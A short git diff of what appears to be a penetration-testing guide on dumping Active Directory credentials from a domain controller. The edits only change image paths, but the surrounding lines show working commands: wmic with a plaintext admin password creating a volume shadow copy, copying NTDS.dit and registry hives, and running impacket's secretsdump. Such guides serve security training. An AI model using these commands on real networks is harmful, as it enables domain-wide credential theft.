@@ -25,7 +25,7 @@ The attack requires Domain Admin credentials and is a post exploitation attack t
 wmic /node:dc02 /user:administrator@amsterdam.bank.local /password:'Welcome01!' process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
 ```
 
-![](<../../../.gitbook/assets/image (15).png>)
+![](<../../../.gitbook/assets/image (15) (1).png>)
 
 3\. Now we can copy the NTDS.dit, SYSTEM and SECURITY hives to the `C:\temp` directory.
 
@@ -49,7 +49,7 @@ cd \\dc02\c$\temp
 
 ![](<../../../.gitbook/assets/image (12) (1).png>)
 
-![](<../../../.gitbook/assets/image (9) (2).png>)
+![](<../../../.gitbook/assets/image (9).png>)
 
 5\. Copy the files to your Kali and execute the following command to extract the credentials.
 
@@ -59,7 +59,7 @@ python3 /opt/impacket/examples/secretsdump.py -system SYSTEM -security SECURITY 
 
 ![](<../../../.gitbook/assets/image (11).png>)
 
-![](<../../../.gitbook/assets/image (14) (1).png>)
+![](<../../../.gitbook/assets/image (14).png>)
 
 
 
